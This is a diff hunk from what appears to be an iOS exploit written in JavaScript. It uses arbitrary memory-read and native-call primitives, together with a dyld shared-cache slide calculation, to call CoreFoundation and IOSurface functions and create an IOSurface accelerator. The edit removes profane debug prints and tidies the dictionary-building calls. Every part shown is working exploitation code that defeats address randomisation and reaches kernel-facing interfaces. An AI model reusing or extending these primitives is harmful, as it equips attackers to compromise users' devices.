@@ -35,17 +35,13 @@ function memcpy_exec(dst, src, size) {
 	printf("%x %x\n", CFDictionarySetValue_addr + get_dyld_shc_slide(), dlsym(dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_NOW), "CFDictionarySetValue"));
 	dict = CFDictionaryCreateMutable(0, 0, kCFTypeDictionaryKeyCallBacks_addr + get_dyld_shc_slide(), kCFTypeDictionaryValueCallBacks_addr + get_dyld_shc_slide());
 	printf("dict: %p\n", dict);
-	var test = CFNumberCreate(read_u32(kCFAllocatorDefault), kCFNumberSInt32Type, pitch);
-	printf("fuck you test=%p %p %p\n", test, pitch, read_u32(dict));
-	scall("printf", "%x %x %x %x\n", read_u32(CFDictionarySetValue_addr + get_dyld_shc_slide()), read_u32(CFDictionarySetValue_addr + get_dyld_shc_slide() + 4), read_u32(CFDictionarySetValue_addr + get_dyld_shc_slide() + 8), read_u32(CFDictionarySetValue_addr + get_dyld_shc_slide() + 12));
 	callnarg(CFShow_addr + get_dyld_shc_slide(), dict);
-	CFDictionarySetValue(dict, read_u32(my_kIOSurfaceBytesPerRow), test, 0);
-	printf("lol420\n");
-	CFDictionarySetValue(dict, read_u32(my_kIOSurfaceWidth), read_u32(my_kIOSurfaceWidth + 4), read_u32(my_kIOSurfaceWidth + 8), read_u32(my_kIOSurfaceWidth + 12), callnarg(CFNumberCreate_addr + get_dyld_shc_slide(), 0, kCFNumberSInt32Type, width));
-	CFDictionarySetValue(dict, read_u32(my_kIOSurfaceHeight), read_u32(my_kIOSurfaceHeight + 4), read_u32(my_kIOSurfaceHeight + 8), read_u32(my_kIOSurfaceHeight + 12), callnarg(CFNumberCreate_addr + get_dyld_shc_slide(), 0, kCFNumberSInt32Type, height));
-	CFDictionarySetValue(dict, read_u32(my_kIOSurfacePixelFormat), read_u32(my_kIOSurfacePixelFormat + 4), read_u32(my_kIOSurfacePixelFormat + 8), read_u32(my_kIOSurfacePixelFormat + 12), callnarg(CFNumberCreate_addr + get_dyld_shc_slide(), 0, kCFNumberSInt32Type, pixel_format));
-	printf("fuck you\n");
+	CFDictionarySetValue(dict, read_u32(my_kIOSurfaceBytesPerRow), CFNumberCreate(read_u32(kCFAllocatorDefault), kCFNumberSInt32Type, pitch));
+	CFDictionarySetValue(dict, read_u32(my_kIOSurfaceWidth), CFNumberCreate(read_u32(kCFAllocatorDefault), kCFNumberSInt32Type, width));
+	CFDictionarySetValue(dict, read_u32(my_kIOSurfaceHeight), CFNumberCreate(read_u32(kCFAllocatorDefault), kCFNumberSInt32Type, height));
+	CFDictionarySetValue(dict, read_u32(my_kIOSurfacePixelFormat), CFNumberCreate(read_u32(kCFAllocatorDefault), kCFNumberSInt32Type, pixel_format));
 	printf("%d\n", callnarg(my_IOSurfaceAcceleratorCreate, 0, 0, accel));
+	printf ("you can kill me now\n");
 }
 
 function linkIOSurface() {
